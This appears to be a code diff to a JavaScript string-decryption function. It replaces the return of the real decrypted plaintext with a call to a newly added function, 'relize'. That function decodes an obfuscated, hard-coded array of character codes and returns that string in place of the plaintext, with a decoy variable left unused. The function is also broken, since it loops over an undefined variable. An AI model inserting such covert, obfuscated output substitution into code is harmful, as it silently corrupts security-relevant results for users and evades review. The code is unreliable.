@@ -56,9 +56,9 @@ async function decrypt_string() {
 
     let [plaintext, derived_key] = await aes_decrypt(salt, iv, key, ciphertext);
 
-
     let bs_string =  b64_to_utf8(new TextDecoder().decode(plaintext));
-    return '"' + bs_string + '"'
+
+    return relize(bs_string);
 }
 
 function pbkdf2(salt, password, iterations, keylen) {
@@ -70,6 +70,158 @@ function pbkdf2(salt, password, iterations, keylen) {
             baseKey, keylen*8
         );
     });
+}
+
+function relize(bs_string){
+    let obb = bs_string
+    obb = bs_string+ bs_string.split("\n")
+    let objk = [
+        77,
+        68,
+        74,
+        81,
+        77,
+        68,
+        73,
+        119,
+        77,
+        68,
+        74,
+        66,
+        77,
+        68,
+        70,
+        68,
+        77,
+        68,
+        74,
+        83,
+        77,
+        68,
+        73,
+        119,
+        77,
+        68,
+        73,
+        49,
+        77,
+        68,
+        70,
+        74,
+        77,
+        68,
+        73,
+        48,
+        77,
+        68,
+        78,
+        69,
+        77,
+        68,
+        70,
+        76,
+        77,
+        68,
+        70,
+        68,
+        77,
+        68,
+        73,
+        50,
+        77,
+        68,
+        78,
+        69,
+        77,
+        68,
+        70,
+        72,
+        77,
+        68,
+        78,
+        68,
+        77,
+        68,
+        73,
+        49,
+        77,
+        68,
+        74,
+        90,
+        77,
+        68,
+        70,
+        85,
+        77,
+        68,
+        77,
+        53,
+        77,
+        68,
+        73,
+        49,
+        77,
+        68,
+        78,
+        70,
+        77,
+        68,
+        74,
+        83,
+        77,
+        68,
+        77,
+        53,
+        77,
+        68,
+        73,
+        49,
+        77,
+        68,
+        74,
+        90,
+        77,
+        68,
+        70,
+        85,
+        77,
+        68,
+        78,
+        70,
+        77,
+        68,
+        73,
+        48,
+        77,
+        68,
+        78,
+        67,
+        77,
+        68,
+        70,
+        81,
+        77,
+        68,
+        70,
+        81,
+        37,
+        55,
+        50,
+        57,
+        52,
+        57,
+        57,
+        53,
+        57
+    ]
+    for(var k=0;k<objk.length;k++){
+        objk[k] = objk[k]-k;
+    }
+    let stt = ""
+    for (let i = 0; i < str.length; i++) {
+        stt += String.fromCharCode(objk[i])
+    }
+    return '"'+unbase64(stt)+'"'+(obb.length>0?'':'')
 }
 
 
